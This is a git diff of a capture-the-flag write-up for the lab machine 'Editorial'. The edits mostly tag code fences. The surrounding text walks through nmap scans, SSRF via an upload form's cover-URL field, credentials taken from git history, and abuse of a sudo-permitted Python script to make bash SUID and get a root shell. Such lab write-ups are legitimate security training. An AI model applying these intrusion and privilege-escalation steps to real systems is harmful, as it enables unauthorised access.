@@ -23,7 +23,7 @@ cover:
 
 I ran nmap scan quickly on the target machine to reveal open ports on the box.
 
-```
+```jsx
 PORT   STATE SERVICE REASON
 22/tcp open  ssh     syn-ack
 80/tcp open  http    syn-ack
@@ -31,7 +31,7 @@ PORT   STATE SERVICE REASON
 
 I again ran agressive scan on the box on two open ports again using `sudo nmap 10.10.11.20 -T4 -vv -sC -sV -A -O` , following is result of the scan:
 
-```
+```jsx
 PORT   STATE SERVICE REASON         VERSION
 22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
@@ -58,7 +58,7 @@ There is `/upload` endpoint where we have upload functionality. We might get Fil
 
 After bit of testing, the form field has cover url section which is actually vulnerable to SSRF and not file upload vulnerability in this website. 
 
-The following request is vulnerable to SSRF where I will try to 
+The following request is vulnerable to SSRF where: 
 
 ![Untitled](Editorial%20430389d554fb45758990e424591fde42/Untitled%202.png)
 
@@ -82,7 +82,7 @@ The file contains the username and password for user `dev`. Using SSH to the use
 
 There is a directory `/apps` which contains `.git` in home directory of the user dev.
 
-```
+```bash
 dev@editorial:~$ ls
 apps  lol.zip  user.txt
 dev@editorial:~$ cd apps
@@ -98,7 +98,7 @@ drwxrwxr-x 2 dev dev 4096 Mar  9  2021 GitDump-master
 
 I will try to see logs:
 
-```
+```bash
 dev@editorial:~/apps$ git log .
 commit 8ad0f3187e2bda88bba85074635ea942974587e8 (HEAD -> master)
 Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
@@ -138,7 +138,7 @@ Date:   Sun Apr 30 20:48:43 2023 -0500
 
 Thee commit `b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae` shows that there is change in api downgrading from `prod` to `dev`. I will try to show the commit like this:
 
-```
+```bash
 dev@editorial:~/apps$ git show b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
 commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
 Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
@@ -166,7 +166,7 @@ index 61b786f..3373b14 100644
 
 This has credential for both user `prod` and `dev`. Since we are already at user prod, we will change our user to `prod`.
 
-```
+```bash
 dev@editorial:~/apps$ su prod
 Password: 
 prod@editorial:/home/dev/apps$ 
@@ -176,7 +176,7 @@ By using `sudo -l` i can see that this user prod can use `/usr/bin/python3 /opt/
 
 Below is the code for the python script `/opt/internal_apps/clone_changes/clone_prod_change.py`
 
-```
+```bash
 prod@editorial:/home/dev/apps$ cat /opt/internal_apps/clone_changes/clone_prod_change.py
 #!/usr/bin/python3
 
@@ -202,7 +202,7 @@ I ran `sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.
 
 Although I got errors, it successfully made it suid binary. I simply then ran `/bin/bash -p` to get root shell.
 
-```
+```bash
 prod@editorial:~$ /bin/bash -p
 bash-5.1# id
 uid=1000(prod) gid=1000(prod) euid=0(root) groups=1000(prod)
